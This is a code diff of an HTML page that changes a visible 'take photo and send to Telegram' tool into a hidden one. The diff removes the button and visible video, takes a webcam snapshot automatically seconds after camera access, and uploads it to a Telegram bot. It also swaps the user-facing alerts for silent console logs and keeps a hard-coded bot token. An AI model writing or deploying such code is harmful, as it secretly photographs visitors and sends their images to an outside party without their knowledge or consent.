@@ -1,49 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Capture</title>
-  <style>
-    video, canvas {
-      display: block;
-      margin: 10px auto;
-      max-width: 100%;
-    }
-    button {
-      display: block;
-      margin: 10px auto;
-      padding: 10px 20px;
-      font-size: 16px;
-    }
-  </style>
+  <title>Auto Camera to Telegram</title>
 </head>
 <body>
 
-<h2 style="text-align:center;">Take Photo and Send to Telegram</h2>
-
-<video id="video" width="320" height="240" autoplay></video>
-<canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
-<button onclick="takePhoto()">Take Photo</button>
+<video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
   const BOT_TOKEN = "7537785860:AAEJYsULgBX48brbbZtRUhfTtGd2v_XZ-zg";
-  const CHAT_ID = "123"; // 👉 Replace with your actual chat ID
+  const CHAT_ID = "1234"; // 👉 ប្ដូរជា chat ID របស់អ្នក
 
-  // Start camera
+  // Activate camera and auto capture
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
-      document.getElementById('video').srcObject = stream;
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      // Wait for video to load and then capture
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          takePhoto();
+        }, 1500); // wait 1.5 seconds before auto capture
+      };
     })
     .catch(error => {
-      alert('Cannot access camera: ' + error.message);
+      alert("Camera access denied or error: " + error.message);
     });
 
   function takePhoto() {
-    const canvas = document.getElementById('canvas');
     const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Convert canvas to blob
     canvas.toBlob(blob => {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
@@ -56,14 +47,13 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          alert("Photo sent to Telegram!");
+          console.log("✅ Photo sent to Telegram.");
         } else {
-          alert("Failed to send photo.");
-          console.error(data);
+          console.error("❌ Failed to send photo:", data);
         }
       })
       .catch(error => {
-        alert("Error: " + error.message);
+        console.error("❌ Error sending photo:", error);
       });
     }, 'image/jpeg');
   }
